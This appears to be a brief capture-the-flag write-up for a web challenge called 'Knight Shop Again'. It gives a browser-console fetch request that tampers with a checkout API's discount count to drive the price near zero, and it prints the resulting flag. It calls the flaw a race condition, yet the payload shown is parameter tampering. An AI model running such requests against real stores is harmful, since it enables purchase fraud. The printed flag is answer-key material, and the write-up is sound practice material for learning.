# web - knight shop again

challenge name: Knight Shop Again
blekbox

analyze we have initial account balance with 50 usd 

we knew this is race condition

add expensive item to cart

paste this in console log
```
fetch('/api/checkout', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ 
    discountCode: 'KNIGHT25', 
    discountCount: 20 // 20 applications of 25% off makes the price nearly $0
  })
})
.then(res => res.json())
.then(data => {
  if (data.flag) {
    console.log("SUCCESS! Flag:", data.flag);
  } else {
    console.log("Response:", data);
  }
});


SUCCESS! Flag: KCTF{kn1ght_c0up0n_m4st3r_2026}
```
Solved by: ud444ng
